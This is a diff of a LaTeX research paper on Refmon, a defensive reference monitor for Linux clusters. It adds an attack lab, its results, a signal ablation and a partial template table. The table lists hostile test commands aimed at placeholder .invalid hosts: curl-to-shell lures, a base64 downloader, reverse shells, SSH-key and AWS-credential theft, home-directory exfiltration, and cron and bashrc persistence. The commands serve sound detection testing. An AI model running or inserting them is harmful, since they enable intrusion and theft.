@@ -102,7 +102,7 @@ Bayesian Log-Odds Calculus for Endpoint, Server, and Cluster Defense}
   Independent AI Researcher\\
   \texttt{parsa@parsabe.com}
 }
-\date{October 2026 \quad (Specification \texttt{v2.0}; signal weights frozen since \texttt{v1.0})}
+\date{November 2026 \quad (Specification \texttt{v2.0}, package \texttt{refmon 2.0.0}; signal weights frozen since \texttt{v1.0})}
 
 \renewenvironment{abstract}{%
   \par\vspace{0.4em}%
@@ -118,7 +118,7 @@ Bayesian Log-Odds Calculus for Endpoint, Server, and Cluster Defense}
   \begin{@twocolumnfalse}
     \maketitle
     \begin{abstract}
-      Signature scanners and opaque machine-learning models struggle against zero-day exploits, ClickFix copy-paste attacks, prompt-injected coding agents, and stealth rootkits, while often exposing sensitive command-line secrets in telemetry logs. We present \textbf{Refmon} (\emph{Provenance Gate v2}), a lightweight reference monitor that evaluates attacks by what a process does after compromise rather than trying to classify payloads upfront. Refmon asks three concrete questions for every event sequence: did the action stem from an untrusted \textbf{Origin}, violate the process's signed role \textbf{Contract}, and attempt a dangerous \textbf{Effect}? Evidence combines through a monotone Bayesian log-odds calculus with an invariant Contract Gate that halts unauthorized actions before harm occurs. An in-memory cryptographic boundary replaces cleartext commands and URLs with per-device HMAC digests, preventing sensitive arguments from touching disk. In benchmarks across 46 golden scenarios, 886 mutation variants, and live cluster attacks, Refmon achieves 100\% golden accuracy and 98.4\% attack containment with zero false blocks on benign workflows.
+      Signature scanners and opaque machine-learning models struggle against zero-day exploits, ClickFix copy-paste attacks, prompt-injected coding agents, and stealth rootkits, while often exposing sensitive command-line secrets in telemetry logs. We present \textbf{Refmon} (\emph{Provenance Gate v2}), a lightweight reference monitor that evaluates attacks by what a process does after compromise rather than trying to classify payloads upfront. Refmon asks three concrete questions for every event sequence: did the action stem from an untrusted \textbf{Origin}, violate the process's signed role \textbf{Contract}, and attempt a dangerous \textbf{Effect}? Evidence combines through a monotone Bayesian log-odds calculus with an invariant Contract Gate that halts unauthorized actions before harm occurs. An in-memory cryptographic boundary replaces cleartext commands and URLs with per-device HMAC digests, preventing sensitive arguments from touching disk. In benchmarks across 46 golden scenarios, 886 pre-registered mutation variants, a 16-scenario live barrier suite, and a 35-template interactive attack lab, Refmon reaches 100\% golden accuracy, contains 98.4\% of malicious variants with zero neutral false blocks, and detects 28/28 lab attacks (27/28 prevented before they act) with no false alarm on benign controls. A single-signal ablation of the lab verdicts shows where the margin is thin: removing one signal would let 9 of 22 score-based blocks through silently, because pasted text alone is deliberately scored below the hold threshold. Refmon currently mediates the commands and files submitted to it; kernel sensors and a real enforcer, needed to sit transparently between the users and the servers of a site, remain future work.
     \end{abstract}
     \vspace{0.3em}
     \noindent\textbf{Keywords:} Reference Monitor, Dynamic Provenance Tracking, Role Contracts, Bayesian Log-Odds, Differential Privacy, Rootkit Detection, HPC Security.\par
@@ -149,6 +149,7 @@ Traditional Endpoint Detection and Response (EDR) software struggles in shared a
   \item \textbf{Transparent Bayesian Calculus \& Contract Gate (\S\ref{sec:judge}--\ref{sec:rates}):} A clean, training-free decision engine that asks three questions: did the action come from an untrusted \textbf{Origin}, violate a signed role \textbf{Contract}, and attempt a dangerous \textbf{Effect}? Evidence is combined with a monotone Bayesian log-odds formula, and a mandatory Contract Gate prevents false blocks on normal user workflows.
   \item \textbf{Six-Engine Rootkit Sensor \& Unprivileged Barrier (\S\ref{sec:rootkit}, \S\ref{sec:impl}):} A multi-pass rootkit detector comparing high-level system views against kernel tables, paired with an Ed25519-signed policy barrier that runs entirely in user space on shared Linux cluster nodes without requiring \texttt{root} privileges.
   \item \textbf{Reproducible Evaluation \& Formal Proofs (\S\ref{sec:eval}, Appendices~\ref{app:decay}--\ref{app:rootkit}):} Rigorous evaluation across 46 golden scenarios, 886 mutation tests, and live cluster attacks, accompanied by mathematical proofs of monotonicity, Bayesian minimal risk, and privacy guarantees.
+  \item \textbf{Interactive Attack Lab \& Evidence-Margin Analysis (\S\ref{sec:lab}, Appendix~\ref{app:lab}):} A command-line lab of 35 harmless attack and benign templates, each mediated by the live pipeline \emph{before} it may run, with saved per-run logs and an automatic analysis that reports evidence margins, single-signal ablations, and blind spots; and an honest account of what deployment between users and servers still requires (\S\ref{sec:discussion}).
 \end{itemize}
 
 % ============================================================================
@@ -516,7 +517,9 @@ All containment actions generate reversible undo tokens $\mathcal{U}$, allowing 
 \subsection{Reference Implementation and Signed Policy Governance}
 \label{sec:impl}
 
-Refmon is implemented in approximately 12,400 lines of strict, type-checked Python~3.12 (plus 10,200 lines of tests) (\texttt{pydantic} v2 frozen schemas, \texttt{cryptography} Ed25519 signatures, zero runtime machine-learning dependencies). Every threshold, weight, role contract, canary, and rate parameter resides in a canonical JSON-serialized, Ed25519-signed \texttt{policy.yaml}; startup and live reload reject any unsigned or tampered policy (\texttt{PolicyRejected}) and retain the last verified state. A periodic \texttt{SelfTest} scheduler clones the live pipeline via \texttt{pipeline.probe()} (preserving live disabled rules and weights while isolating outputs) to inject synthetic health stories and raise immediate alerts if any enabled protection fails to reach its expected decision.
+Refmon is implemented in approximately 14,300 lines of strict, type-checked Python~3.12 (plus 10,500 lines of tests) (\texttt{pydantic} v2 frozen schemas, \texttt{cryptography} Ed25519 signatures, zero runtime machine-learning dependencies). Every threshold, weight, role contract, canary, and rate parameter resides in a canonical JSON-serialized, Ed25519-signed \texttt{policy.yaml}; startup and live reload reject any unsigned or tampered policy (\texttt{PolicyRejected}) and retain the last verified state. A periodic \texttt{SelfTest} scheduler clones the live pipeline via \texttt{pipeline.probe()} (preserving live disabled rules and weights while isolating outputs) to inject synthetic health stories and raise immediate alerts if any enabled protection fails to reach its expected decision.
+
+\paragraph{Packaging.} Refmon is a standard Python package (\texttt{pyproject.toml}, build backend \texttt{hatchling}, version \texttt{2.0.0}). Installing it (\texttt{pip install .}) provides the library and one command, \texttt{refmon}, whose subcommands cover the policy life cycle (\texttt{keygen}, \texttt{init-policy}, \texttt{sign}, \texttt{verify}, \texttt{learn}, \texttt{approve}, \texttt{apply}), the privacy \texttt{audit}, the read-only \texttt{scan-rootkit}, the long-running \texttt{serve} daemon with its one-shot \texttt{guard} client, and the interactive \texttt{lab} (\S\ref{sec:lab}). We verified a clean install into a fresh environment: every subcommand works outside the repository except the golden replay, whose 46 scenario files live in the test tree and are not part of the wheel.
 
 \subsection{Core Pipeline and Scanner Algorithms}
 \label{sec:algorithms}
@@ -642,7 +645,7 @@ Table~\ref{tab:results_matrix} summarizes the progression from \texttt{v1.0} to 
   \label{fig:cluster_deployment}
 \end{figure*}
 
-Figure~\ref{fig:cluster_deployment} illustrates how Refmon protects shared Linux HPC nodes where researchers lack \texttt{root} privileges. The background service (\texttt{refmon serve}) verifies the Ed25519-signed policy, monitors user-space staging directories every $400$~ms, and provides a lightweight local telemetry interface. Because all local users on a shared multi-tenant cluster can connect to localhost network ports, every API call requires a per-daemon secret token stored in a private directory (\texttt{mode 0700}), and all requests with non-local HTTP \texttt{Host} headers are rejected to prevent DNS rebinding attacks.
+Figure~\ref{fig:cluster_deployment} illustrates how Refmon can be operated on shared Linux HPC nodes where researchers lack \texttt{root} privileges: as an opt-in barrier for the commands sent through it and for watched directories, ahead of the kernel sensors of \S\ref{sec:future}. The background service (\texttt{refmon serve}) verifies the Ed25519-signed policy, monitors user-space staging directories every $400$~ms, and provides a lightweight local telemetry interface. Because all local users on a shared multi-tenant cluster can connect to localhost network ports, every API call requires a per-daemon secret token stored in a private directory (\texttt{mode 0700}), and all requests with non-local HTTP \texttt{Host} headers are rejected to prevent DNS rebinding attacks.
 
 Table~\ref{tab:live_suite} (Appendix~\ref{app:supplementary}) shows results from our live 16-scenario test suite ($16/16 = 100\%$ expected verdicts):
 \begin{itemize}[leftmargin=1.3em,itemsep=1.5pt,topsep=2pt]
@@ -655,6 +658,90 @@ In host integrity scans, the rootkit engine suppresses benign GPU driver kernel 
 
 \paragraph{Pre-Execution Command Intent Prediction.} To protect interactive terminals, Refmon inspects commands *before* the shell executes them. The barrier analyzes typed commands to predict the events they would produce, checking for hidden network tunnels (\texttt{socat}, netcat, reverse SSH shells), attempts to read sensitive credentials (\texttt{.aws}, \texttt{.kube}, private SSH keys), modifications to startup scripts or git hooks, and attempts to wipe shell history. To counter common shell obfuscation techniques, Refmon evaluates commands both as written and after stripping quotes, backslashes, and variable insertions (such as \texttt{\$\{IFS\}}). Table~\ref{tab:intent} (Appendix~\ref{app:supplementary}) summarizes this coverage across 69 diverse probe commands.
 
+\subsection{Interactive Attack Lab and Evidence-Margin Analysis}
+\label{sec:lab}
+
+\begin{figure}[!t]
+  \centering
+  \resizebox{\columnwidth}{!}{%
+  \begin{tikzpicture}[
+    font=\scriptsize\sffamily, >=Latex,
+    box/.style={rectangle, rounded corners=2pt, draw=black!70, fill=blue!4, thick, minimum width=2.3cm, minimum height=0.7cm, align=center},
+    io/.style={rectangle, rounded corners=2pt, draw=black!60, fill=gray!10, thick, minimum width=2.3cm, minimum height=0.6cm, align=center},
+    ok/.style={rectangle, rounded corners=2pt, draw=green!55!black, fill=green!10, thick, minimum width=2.0cm, minimum height=0.6cm, align=center},
+    hd/.style={rectangle, rounded corners=2pt, draw=orange!75!black, fill=yellow!16, thick, minimum width=2.0cm, minimum height=0.6cm, align=center},
+    no/.style={rectangle, rounded corners=2pt, draw=red!70!black, fill=red!10, thick, minimum width=2.0cm, minimum height=0.6cm, align=center}
+  ]
+    \node[io]  (tpl) at (0, 3.2) {35 templates\\[-1pt]\tiny or own \texttt{\$ command}};
+    \node[box] (int) at (0, 2.0) {Intent analysis\\[-1pt]\tiny predict events from text};
+    \node[box] (pipe) at (0, 0.8) {Observe $\to$ Tag $\to$ Link\\[-1pt]$\to$ Judge $\to$ Gate};
+    \node[no]  (blk) at (-2.7, -0.6) {\textbf{BLOCK}\\[-1pt]\tiny never runs};
+    \node[hd]  (hld) at (0, -0.6) {\textbf{HOLD}\\[-1pt]\tiny ask: release?};
+    \node[ok]  (alw) at (2.7, -0.6) {\textbf{ALLOW}\\[-1pt]\tiny run in sandbox};
+    \node[box] (wat) at (2.7, -1.9) {Sandbox watcher\\[-1pt]\tiny files written};
+    \node[io]  (log) at (0, -3.1) {Saved run: JSONL, CSV, report,\\[-1pt]analysis (margins, ablation)};
+    \draw[->, thick] (tpl) -- (int);
+    \draw[->, thick] (int) -- node[right, font=\tiny]{\texttt{RawEvent}s} (pipe);
+    \draw[->, thick, red!70!black] (pipe) -| (blk);
+    \draw[->, thick, orange!75!black] (pipe) -- (hld);
+    \draw[->, thick, green!50!black] (pipe) -| (alw);
+    \draw[->, thick, green!50!black] (hld) -- node[above, font=\tiny]{yes} (alw);
+    \draw[->, thick] (alw) -- (wat);
+    \draw[->, densely dashed, black!60] (blk) |- (log);
+    \draw[->, densely dashed, black!60] (hld) -- (log);
+    \draw[->, densely dashed, black!60] (wat) |- (log);
+  \end{tikzpicture}}
+  \caption{Attack lab flow. A command is judged before it may run; only an ALLOW, or a HOLD the user releases, executes, inside the sandbox (fake \texttt{HOME}, 5~s timeout). File attacks are performed in the sandbox and judged by the watcher. Every verdict is saved for analysis.}
+  \label{fig:lab}
+\end{figure}
+
+\paragraph{Design.} To let an operator probe the barrier by hand, Refmon ships an interactive command-line attack lab (\texttt{refmon lab}). It offers 35 templates (Table~\ref{tab:lab_templates}, Appendix~\ref{app:lab}): 28 attacks in six families (social engineering, remote access and privilege, credentials, exfiltration and persistence, tampering and destruction, server, and two file attacks performed for real in the sandbox), one documented known limit, and six benign controls. As Figure~\ref{fig:lab} shows, every command is sent through the live barrier before it may run; only an ALLOW, or a HOLD released by the user, executes, with the sandbox workspace as working directory, a fake home directory holding fake keys as \texttt{HOME}, and a 5~s timeout. All attack hosts lie under \texttt{.invalid}, which never resolves. Seven templates would touch the real system if they ran (\texttt{sudo}, \texttt{crontab}, \texttt{systemctl}, \texttt{pkill}, \texttt{docker}, a recursive delete or archive of the home directory); they are judged but never executed, even in observe mode. Operators can type their own commands with a chosen origin and role. Each run is saved as JSONL, CSV, a Markdown report and a JSON summary that records the thresholds, the weights, the version, the git commit and the policy digest; the operator's own commands are stored only as HMAC fingerprints.
+
+\begin{table}[!t]
+  \centering
+  \caption{Attack Lab, Reference Run (\texttt{mode=block}, git \texttt{771bf8b}). Detected = BLOCK or HOLD; prevented = never ran or quarantined.}
+  \label{tab:lab_results}
+  \footnotesize
+  \setlength{\tabcolsep}{4pt}
+  \begin{tabular}{@{}lrrr@{}}
+    \toprule
+    \textbf{Family} & \textbf{N} & \textbf{Detected} & \textbf{Prevented} \\
+    \midrule
+    Social engineering & 4 & 4 & 4 \\
+    Remote access, privilege & 7 & 7 & 7 \\
+    Credentials, exfil., persist. & 7 & 7 & 7 \\
+    Tampering, destruction & 5 & 5 & 5 \\
+    Server & 3 & 3 & 3 \\
+    File attacks (performed) & 2 & 2 & 1 \\
+    \midrule
+    \textbf{All attacks} & \textbf{28} & \textbf{28} & \textbf{27} \\
+    \midrule
+    Known limit (script by name) & 1 & 0 & 0 \\
+    Benign (false alarms) & 6 & 0 & --- \\
+    \bottomrule
+  \end{tabular}
+\end{table}
+
+\paragraph{Results.} Table~\ref{tab:lab_results} summarises the reference run. All 28 attacks are detected and 27 are prevented: the 60-file ransomware burst is detected only after the writes, because the writes are the attack. None of the six benign controls is held or blocked; the known limit is allowed, as documented. Contract fails in 27 of the 28 attacks, Effect in 27, Origin in only 24, and 23 attacks fail all three questions. Four attacks (the canary read, killing Refmon, the home-directory wiper and the ransomware burst) are caught with no external origin at all, which is the point of judging consequences rather than entry. Six attacks end in an absolute override (protected asset three times, canary twice, self-tamper once). In observe mode the same decisions are reached and none of the attacks is stopped. A decision takes a median of 3.9~ms per command on the shared login node (mean 11.6~ms; the first call of a session is the slowest, 159~ms), before the command starts.
+
+\begin{table}[!t]
+  \centering
+  \caption{Single-Signal Ablation of the 22 Score-Based Lab Blocks: the worst decision when any one Contract or Effect signal is removed, applying the contract gate.}
+  \label{tab:lab_ablation}
+  \footnotesize
+  \begin{tabularx}{\columnwidth}{@{}l r >{\raggedright\arraybackslash}X@{}}
+    \toprule
+    \textbf{Becomes} & \textbf{N} & \textbf{Blocks (signal removed, new $L$)} \\
+    \midrule
+    ALLOW & 9 & 3 reverse-access and 3 escalation pastes (\texttt{fetch} or \texttt{escalate}), \texttt{mail\_b64}, \texttt{ld\_preload} (\texttt{hide}), \texttt{web\_rce} (\texttt{web\_worker\_exec}); all $L = -5.11$ \\
+    HOLD & 12 & 6 pastes losing \texttt{external\_exec} ($-3.61$, gated), \texttt{web\_shell} losing \texttt{write\_executable} ($-3.61$, gated), 5 tamper or mass-change blocks ($-4.11$ to $-4.91$) \\
+    BLOCK & 1 & \texttt{typosquat}: two Contract signals \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+
+\paragraph{Evidence margins and ablation.} The 22 score-based blocks (the other six are overrides) lie on average $+1.62$~nats above $\tau_b$; the thinnest three ($+0.80$) are the base64 mail script, the preload injection and the web-worker RCE. Removing any single Contract or Effect signal (Table~\ref{tab:lab_ablation}) would let 9 of the 22 through silently, leave 12 held, and keep one blocked. The reason is structural: a pasted command scores $-6.91 + 0.8 + 1.0 = -5.11 < \tau_h$, deliberately, so that harmless pasted commands are not interrupted (scenario \texttt{S11}). A pasted attack is therefore blocked only because the intent analysis predicts at least one Effect from the command text. The harmless pasted control lies $0.17$~nats under $\tau_h$, and the known limit (a script run by name) receives exactly the same evidence: from the text alone the two cannot be told apart. The evidence calculus overrules the 3/2/1 rule five times: three two-fail attacks become BLOCK instead of HOLD, and the two two-fail pastes become ALLOW instead of HOLD, so under the plain rule the hidden script would at least have been held. A practical consequence for a site: a tutorial command that downloads from a host the policy does not list scores like ClickFix ($L = -2.61$, BLOCK), so a deployment must list its own trusted hosts.
+
 \subsection{Adversarial Privacy Audit and Test Suite Summary}
 \label{sec:privacy_eval}
 
@@ -663,7 +750,7 @@ Running \texttt{refmon audit} executes an active red-team privacy audit across a
   \item \textbf{Cleartext Leakage:} $264$ output artefacts scanned $\to$ \textbf{$0$ raw content findings}.
   \item \textbf{Dictionary HMAC Attack:} $349$ fingerprints attacked across $2,119$ common command/URL guesses without $K_{\text{dev}}$ $\to$ \textbf{$0$ reversals} (whereas a positive control given $K_{\text{dev}}$ reverses $6/6$, confirming attack-harness validity).
   \item \textbf{Four-Eyes Escrow:} $10$ single-approver re-identification attempts $\to$ \textbf{$0$ permitted}; dual-approver requests succeed with hash-chain integrity verified ($\texttt{audit chain intact = True}$).
-  \item \textbf{Automated Verification:} Across unit, Hypothesis property-based, golden replay, variant-matrix, rootkit, command-intent, CLI, and live HTTP tests, over $1,860$ automated tests pass.
+  \item \textbf{Automated Verification:} Across unit, Hypothesis property-based, golden replay, variant-matrix, rootkit, command-intent, CLI, live HTTP, and attack-lab tests, $1,884$ automated tests pass, with one documented expected failure (the S19 stand-in changes 55 files where the hour-scale test needs 60). The randomised containment property test once failed on a generated process that reported a second parent later; the tagger keeps the parent from a process's first event, the test's own oracle took the last one. The oracle was corrected and the stream pinned as an explicit example; the core was unchanged.
 \end{itemize}
 
 \clearpage
@@ -672,21 +759,27 @@ Running \texttt{refmon audit} executes an active red-team privacy audit across a
 % ============================================================================
 \section{Discussion}
 \label{sec:discussion}
-Attacks change payloads constantly, but what they do after gaining a foothold stays tied to OS rules: a web worker spawning a shell or dropping scripts will always break its role contract, no matter how clever the exploit. Refmon catches these actions by checking what happened instead of guessing what the payload looked like, while leaving ordinary developer commands alone. Fixing evidence monotonicity in \texttt{v1.3} and scoping trust to process lineage in \texttt{v2.0} closed edge-case leaks and cut false blocks to zero without widening permissions. Refmon keeps decisions deterministic rather than using reinforcement learning at runtime, avoiding reward poisoning and unexplainable black-box actions. Where gaps remain---such as out-of-band typed commands or slow leaks spread across hours---Refmon holds for human review rather than guessing, providing a reliable defense on shared nodes until kernel eBPF hooks can be deployed.
+Attacks change payloads constantly, but what they do after gaining a foothold stays tied to OS rules: a web worker spawning a shell or dropping scripts will always break its role contract, no matter how clever the exploit. Refmon catches these actions by checking what happened instead of guessing what the payload looked like, while leaving ordinary developer commands alone. Fixing evidence monotonicity in \texttt{v1.3} and scoping trust to process lineage in \texttt{v2.0} closed edge-case leaks and cut false blocks to zero without widening permissions. Refmon keeps decisions deterministic rather than using reinforcement learning at runtime, avoiding reward poisoning and unexplainable black-box actions. Where gaps remain---such as out-of-band typed commands or slow leaks spread across hours---Refmon holds for human review rather than guessing.
+
+\paragraph{What the attack lab shows.} The lab confirms the catalog results on commands an operator chooses, and it exposes where the margin is thin (\S\ref{sec:lab}). For pasted commands the Effect question carries the decision: the design keeps harmless pastes below $\tau_h$, so a paste whose effect the command text hides (a script run by name, a compiled binary) is allowed. This is a property of the pre-execution barrier, which can only read text; a kernel sensor would observe the script's reads and connections and judge them in the same story.
+
+\paragraph{Limitations.} Refmon today judges only what is submitted to it: commands sent through \texttt{guard} or the lab, files in its watched sandbox, and recorded event files. A user who does not use the barrier bypasses it. The live daemon runs as the user it protects, so a process of that user can stop it; the self-tamper override applies only to commands that pass the barrier. The enforcer in the repository is simulated: the only real actions are refusing a guarded command and moving sandbox files into quarantine. Every result is a replay or a harmless stand-in (design decision A58); none was measured on real workloads. The reference policy lists placeholder hosts, so the destinations and trusted sources of a site must be written before use.
+
+\paragraph{Deployment status.} Refmon is an installable package, and \texttt{refmon serve} is the only component meant to run continuously (as the user, for example under \texttt{systemd -{}-user}). Placing it between the users and the servers of an organisation needs, in order: the agreement of the operator (IT security; for staff machines in Germany also the data protection officer, with a data protection impact assessment, and the staff council); an isolated lab VM with root access; a kernel sensor behind \texttt{Sensor.emit} and a real enforcer behind \texttt{Enforcer.act} (\S\ref{sec:future}); a lab validation in which lab verdicts equal replay verdicts and the per-event overhead is measured; a site policy whose contracts are learned in learning mode and approved by a person; and a pilot in observe mode, measured against targets fixed in advance (no benign block per week, at most one hold per user per week), before enforcement is enabled role by role as a root-owned system service.
 
 % ============================================================================
 % 6. FUTURE WORK
 % ============================================================================
 \section{Future Work}
 \label{sec:future}
-We plan to hook Refmon directly into Linux \texttt{eBPF} LSM and \texttt{fanotify} for non-bypassable kernel-level mediation across all processes. We are also extending provenance tracking across multi-node Slurm and MPI batch jobs on shared clusters, tuning multi-day drift detectors for ultra-slow ransomware, and backing policy keys with TPM hardware roots of trust before running a longitudinal campus pilot.
+We plan to hook Refmon directly into Linux \texttt{eBPF} LSM and \texttt{fanotify} (or, as a first step, \texttt{auditd}) for non-bypassable kernel-level mediation across all processes, with an enforcer built on the cgroup freezer, process-tree kill, per-cgroup \texttt{nftables} rules and a root-owned quarantine, each with its undo record. The barrier itself can narrow the known limit before then, by reading a script that a command runs by name and judging its text together with the command. We are also extending provenance tracking across multi-node Slurm and MPI batch jobs on shared clusters, tuning multi-day drift detectors for ultra-slow ransomware, and backing policy keys with TPM hardware roots of trust before running a longitudinal campus pilot.
 
 % ============================================================================
 % 7. CONCLUSION
 % ============================================================================
 \section{Conclusion}
 \label{sec:conclusion}
-Refmon demonstrates that tracking behavioral consequences rather than exploit payloads provides a reliable, privacy-preserving defense against zero-day exploits, ClickFix lures, and stealth rootkits. Evaluated across 46 golden scenarios, 886 mutation variants, and a live cluster barrier suite, Refmon achieves 100\% golden accuracy and 98.4\% attack containment with zero false blocks on benign workloads. Its mathematically verified monotonicity, minimal Bayes risk, and in-memory privacy boundary make it a practical, robust security foundation for shared computing clusters.
+Refmon demonstrates that tracking behavioral consequences rather than exploit payloads provides a reliable, privacy-preserving defense against zero-day exploits, ClickFix lures, and stealth rootkits. Evaluated across 46 golden scenarios, 886 mutation variants, a live cluster barrier suite and a 35-template attack lab, Refmon achieves 100\% golden accuracy, 98.4\% containment of malicious variants with zero neutral false blocks, and detects all 28 lab attacks with no false alarm. Its mathematically verified monotonicity, minimal Bayes risk, and in-memory privacy boundary make it a sound foundation; the lab's ablation shows that pasted attacks rest on a single predicted Effect, and kernel sensors with a real enforcer are the remaining step before it can protect the users and servers of a shared site.
 
 % ============================================================================
 % 8. AI DISCLOSURE
@@ -894,6 +987,60 @@ if execute and not blocked_by_barrier and j.decision is Decision.ALLOW:
     \bottomrule
   \end{tabular}
 \end{table}
+
+\section{Attack Lab Templates and Reference Run}
+\label{app:lab}
+
+Table~\ref{tab:lab_templates} lists every template of the attack lab (\S\ref{sec:lab}) with the decision of the reference run (\texttt{refmon lab -{}-test-all}, \texttt{mode=block}, git \texttt{771bf8b}). Commands run with the sandbox workspace as working directory, so \texttt{../fakehome} is the fake home and \texttt{../secrets} holds the canary. $^{*}$: judged, never executed. Overrides: (P) protected asset, (C) canary, (S) self-tamper. \texttt{O C E}: \texttt{X} marks a failed question.
+
+\begin{table*}[!p]
+  \centering
+  \caption{All 35 Attack Lab Templates with the Reference-Run Decision.}
+  \label{tab:lab_templates}
+  \scriptsize
+  \setlength{\tabcolsep}{3pt}
+  \begin{tabularx}{\textwidth}{@{}r l l l >{\raggedright\arraybackslash}X l r l l@{}}
+    \toprule
+    \textbf{\#} & \textbf{Template} & \textbf{Family} & \textbf{Origin} & \textbf{Command} & \textbf{Refmon} & \textbf{$L$} & \textbf{O C E} & \textbf{Result} \\
+    \midrule
+    1 & \texttt{clickfix} & social eng. & \texttt{web} & \texttt{curl -{}fsSL https:/\allowbreak{}/\allowbreak{}update-{}fix.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}fix.\allowbreak{}sh |\allowbreak{} sh} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    2 & \texttt{clickfix\_obf} & social eng. & \texttt{web} & \texttt{c\textquotesingle{}\textquotesingle{}url\$\{IFS\}-s\$\{\allowbreak{}IFS\}https:/\allowbreak{}/\allowbreak{}cdn.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}p|\allowbreak{}s\textquotesingle{}\textquotesingle{}h} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    3 & \texttt{mail\_b64} & social eng. & \texttt{mail} & \texttt{echo Y3VybCAtcyBodHRw\allowbreak{}Oi8vYzIuZXhhbXBs\allowbreak{}ZS5pbnZhbGlkL3Ag\allowbreak{}fCBzaA=\allowbreak{}=\allowbreak{} |\allowbreak{} base64 -{}d |\allowbreak{} sh} & BLOCK & $-3.11$ & \texttt{X X X} & stopped \\
+    4 & \texttt{ai\_injection} & social eng. & \texttt{agent\_input} & \texttt{curl -{}s -{}d @\allowbreak{}.\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}.\allowbreak{}ssh/\allowbreak{}id\_ed25519 https:/\allowbreak{}/\allowbreak{}collect.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}upload} & BLOCK (P) & $-0.11$ & \texttt{X X X} & stopped \\
+    5 & \texttt{revshell\_bash} & remote/priv. & \texttt{web} & \texttt{bash -{}c \textquotesingle{}sh -{}i \textgreater{}\& /\allowbreak{}dev/\allowbreak{}tcp/\allowbreak{}c2.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}4444 0\textgreater{}\&1\textquotesingle{}} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    6 & \texttt{revshell\_py} & remote/priv. & \texttt{web} & \texttt{python3 -{}c \textquotesingle{}import socket;\allowbreak{}s=\allowbreak{}socket.\allowbreak{}socket();\allowbreak{}s.\allowbreak{}connect((\textquotedbl{}c2.\allowbreak{}example.\allowbreak{}invalid\textquotedbl{},\allowbreak{}4444))\textquotesingle{}} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    7 & \texttt{ssh\_tunnel} & remote/priv. & \texttt{web} & \texttt{ssh -{}o BatchMode=\allowbreak{}yes -{}o ConnectTimeout=\allowbreak{}2 -{}R 9000:localhost:2\allowbreak{}2 op@\allowbreak{}relay.\allowbreak{}example.\allowbreak{}invalid} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    8 & \texttt{ld\_preload} & remote/priv. & \texttt{web} & \texttt{LD\_PRELOAD=\allowbreak{}/\allowbreak{}tmp/\allowbreak{}.\allowbreak{}x/\allowbreak{}libhook.\allowbreak{}so ls} & BLOCK & $-3.11$ & \texttt{X X X} & stopped \\
+    9 & \texttt{suid\_copy} & remote/priv. & \texttt{web} & \texttt{cp /\allowbreak{}bin/\allowbreak{}sh .\allowbreak{}/\allowbreak{}helper \&\& chmod 4755 .\allowbreak{}/\allowbreak{}helper} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    10 & \texttt{sudo\_suid}$^{*}$ & remote/priv. & \texttt{web} & \texttt{sudo -{}n chmod u+s /\allowbreak{}bin/\allowbreak{}bash} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    11 & \texttt{docker\_escape}$^{*}$ & remote/priv. & \texttt{web} & \texttt{docker run -{}-{}privileged -{}v /\allowbreak{}:/\allowbreak{}host alpine chroot /\allowbreak{}host sh} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    12 & \texttt{steal\_aws} & data/persist. & \texttt{web} & \texttt{cat .\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}.\allowbreak{}aws/\allowbreak{}credentials} & BLOCK (P) & $-1.61$ & \texttt{X X X} & stopped \\
+    13 & \texttt{steal\_ssh} & data/persist. & \texttt{web} & \texttt{cat .\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}.\allowbreak{}ssh/\allowbreak{}id\_ed25519} & BLOCK (P) & $-1.61$ & \texttt{X X X} & stopped \\
+    14 & \texttt{canary} & data/persist. & \texttt{none} & \texttt{cat .\allowbreak{}.\allowbreak{}/\allowbreak{}secrets/\allowbreak{}canary-{}db.\allowbreak{}conf} & BLOCK (C) & $-3.41$ & \texttt{. . X} & stopped \\
+    15 & \texttt{exfil\_home}$^{*}$ & data/persist. & \texttt{web} & \texttt{tar czf -{} \textasciitilde{} |\allowbreak{} curl -{}s -{}T -{} https:/\allowbreak{}/\allowbreak{}drop.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    16 & \texttt{persist\_bashrc} & data/persist. & \texttt{web} & \texttt{echo \textquotesingle{}curl -{}s https:/\allowbreak{}/\allowbreak{}c2.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}b |\allowbreak{} sh\textquotesingle{} \textgreater{}\textgreater{} .\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}.\allowbreak{}bashrc} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    17 & \texttt{persist\_githook} & data/persist. & \texttt{web} & \texttt{echo \textquotesingle{}curl -{}s https:/\allowbreak{}/\allowbreak{}c2.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}b|\allowbreak{}sh\textquotesingle{} \textgreater{} .\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}project/\allowbreak{}.\allowbreak{}git/\allowbreak{}hooks/\allowbreak{}post-{}checkout} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    18 & \texttt{persist\_cron}$^{*}$ & data/persist. & \texttt{web} & \texttt{(crontab -{}l;\allowbreak{} echo \textquotesingle{}@\allowbreak{}reboot curl -{}s https:/\allowbreak{}/\allowbreak{}c2.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}b|\allowbreak{}sh\textquotesingle{}) |\allowbreak{} crontab -{}} & BLOCK & $-2.61$ & \texttt{X X X} & stopped \\
+    19 & \texttt{kill\_refmon}$^{*}$ & tamper/destroy & \texttt{none} & \texttt{pkill -{}f refmon} & BLOCK (S) & $-1.91$ & \texttt{. X X} & stopped \\
